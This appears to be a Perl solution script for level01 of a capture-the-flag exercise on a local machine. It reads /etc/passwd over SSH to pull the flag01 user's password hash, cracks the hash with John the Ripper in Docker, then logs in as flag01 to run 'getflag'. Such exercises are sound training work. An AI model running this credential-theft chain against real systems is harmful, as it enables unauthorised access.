#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$passwd = "cat /etc/passwd | grep flag01";
$input = `ssh -qp $port level01\@$ip '$passwd'`;
@split = split(':', $input);
$pass = $split[1];
$docker = "docker run --rm -v ./pass:/home/john/pass nbaars/john-the-ripper sh -c './john /home/john/pass 2>/dev/null'";
print $red, "$passwd\n", $reset, $input, "$pass\n", $green, `echo $pass > pass ; $docker | tail -n 1 && rm pass`, $reset;
system("ssh -qp $port flag01\@$ip 'getflag'");
